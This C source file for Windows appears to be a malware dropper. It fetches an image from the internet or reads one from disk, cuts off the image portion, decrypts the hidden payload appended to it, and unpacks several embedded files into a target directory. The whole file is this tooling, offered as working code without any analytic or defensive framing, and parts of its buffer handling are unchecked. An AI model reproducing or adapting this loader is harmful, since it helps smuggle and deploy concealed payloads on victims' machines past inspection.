#include <Windows.h>
#include <stdlib.h>

#include "loader.h"
#include "download.h"
#include "crypt.h"


#define IMAGE_SIZE 21256


void dumpBuf(char* buf, ULONG bufLen, char* name)
{
	#ifdef WANT_DUMP
	FILE* dump;

	dump = fopen(name, "wb");
	if(dump != NULL)
	{
		fwrite(buf, sizeof(BYTE), bufLen, dump);
		fclose(dump);
	}
	#endif
}


BOOL FileRead(char* name, PVOID buf, long *bufSize)
{
	BOOL ret = FALSE;
	HANDLE f;
	DWORD size;
	DWORD len;

	f = CreateFileA(name, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, 0);
	if (f != INVALID_HANDLE_VALUE)
	{
		size = GetFileSize(f, NULL);
		if (size>0 && size<HIDDEN_MAX_SIZE)
		{
			ret = ReadFile(f, buf, size, &len, NULL);

			if (bufSize) 
				*bufSize = size;
		}
		CloseHandle(f);
	}
	return ret;
}


void FileSave(const char* name, char* data, int size)
{
	HANDLE fout = CreateFileA(name, GENERIC_WRITE, 0, 0, CREATE_ALWAYS, 0, 0);
	DWORD len;

	if(fout == INVALID_HANDLE_VALUE)
		return;

	WriteFile(fout, data, size, &len, 0);

	CloseHandle(fout);
}



int main(int argc, char* argv[])
{
	TCHAR wBuf[FILE_NAME_MAX_SZ+1] = L"";
	PCHAR h;
	long hLen;
	ULONG err = 0;
	ULONG c = 0;
	ULONG i = 0;
	char fName[FILE_NAME_MAX_SZ] = "";
	char* fBuf;
	HCRYPTKEY key;

	BOOL download = FALSE;
	long imageSize = 0;

	char dispatchDir[MAX_PATH] = "";


	// Defining which type of command line is used
	if(argc == 3)
		download = FALSE;
	else if(argc == 5)
		download = TRUE;
	else
		return 0;


	h = (PCHAR)(malloc(HIDDEN_MAX_SIZE + 1));
	if(h == NULL)
		return 0;
	

	// Get the image
	if(download == TRUE)
	{
		// Downloading
		if(strcmp(argv[2], "") != 0 && strcmp(argv[3], "") != 0)
			err = getHiddenFromInternet(h, &hLen, argv[2], argv[3]);
		else
			err = getHiddenFromInternet(h, &hLen, NULL, NULL);
	}
	else
	{
		// Loading
		err = FileRead(argv[2], (PVOID*)h, &hLen);
	}

	// Success ?
	if(err == FALSE)
		return 0;


	// Size of the image
	if(imageSize == 0)
		imageSize = IMAGE_SIZE;

	if(hLen < imageSize)
		return 0;

	// We take back hidden from image
	hLen -= imageSize;
	memcpy(h, h + imageSize, hLen);
#ifdef WANT_DUMP
	dumpBuf(h, hLen, "hidden_crypt");
#endif

	// Decrypt hidden
	if(getKey(&key) == FALSE)
		return 0;
	if(decryptBuf(key, h, &hLen) == FALSE)
		return 0;

#ifdef WANT_DUMP
	dumpBuf(h, hLen, "hidden");
#endif


	// ******* Loop *******
	while(1)
	{
		// Checking for new file
		if(memcmp(h + c, ENTITY, ENTITY_SZ) != 0)
			break;
		c += ENTITY_SZ;

		// File name
		for(i=0; i<FILE_NAME_MAX_SZ; i++)
		{
			if(memcmp(h + c, ENDLINE, ENDLINE_SZ) == 0)
			{
				c += ENDLINE_SZ;
				memcpy(fName+i, "\0", 1);
				break;
			}
			else
			{
				memcpy(fName+i, h + c, 1);
				c++;
			}
			if(i == FILE_NAME_MAX_SZ - 1)
			{
				free(h);
				return 0;
			}
		}

		// File memory allocation
		fBuf = (char*)malloc(ENTITY_MAX_SZ+1);
		if(fBuf == NULL)
		{
			free(h);
			return 0;
		}

		// Get file
		for(i=0; i<ENTITY_MAX_SZ; i++)
		{
			if(memcmp(h + c, ENTITY_END, ENTITY_END_SZ) == 0)
			{
				c += ENTITY_END_SZ;
				break;
			}
			else
			{
				memcpy(fBuf+i, h + c, 1);
				c++;
			}
			if(i == ENTITY_MAX_SZ - 1)
			{
				free(fBuf);
				free(h);
				return 0;
			}
		}

		strncpy(dispatchDir, argv[1], MAX_PATH);
		strcat(dispatchDir, "\\");
		strncat(dispatchDir, fName, MAX_PATH - strlen(dispatchDir));
		FileSave(dispatchDir, fBuf, i);

		free(fBuf);
	}

	free(h);
	return 1;
}
